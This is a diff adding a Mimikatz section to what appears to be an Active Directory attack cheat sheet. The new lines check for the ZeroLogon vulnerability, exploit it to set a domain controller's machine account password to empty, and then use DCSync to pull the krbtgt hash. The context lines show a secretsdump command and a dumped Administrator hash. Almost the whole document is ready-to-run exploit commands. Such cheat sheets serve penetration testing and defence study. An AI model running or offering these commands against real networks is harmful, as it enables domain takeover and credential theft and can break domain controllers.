@@ -292,6 +292,17 @@ $ secretsdump.py 'domain/DC01$@DC01.domain.local' -hashes aad3b435b51404eeaad3b4
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:00000000000000000000000000000000:::  
 ```
 
+with Mimikatz : 2.2.0 20200916 ZeroLogon & DCSync
+
+```powershell
+privilege::debug
+# check for the CVE
+lsadump::zerologon /target:DC01.corp.local /account:DC01$
+# exploit the CVE and set the computer account's password to ""
+lsadump::zerologon /target:DC01.corp.local /account:DC01$ /exploit
+# dcsync to extract some hashes
+lsadump::dcsync /domain:CORP.LOCAL /dc:dc01.corp.local /user:krbtgt /authuser:DC01$ /authdomain:CORP /authpassword:"" /authntlm
+```
 
 ### Open Shares
 
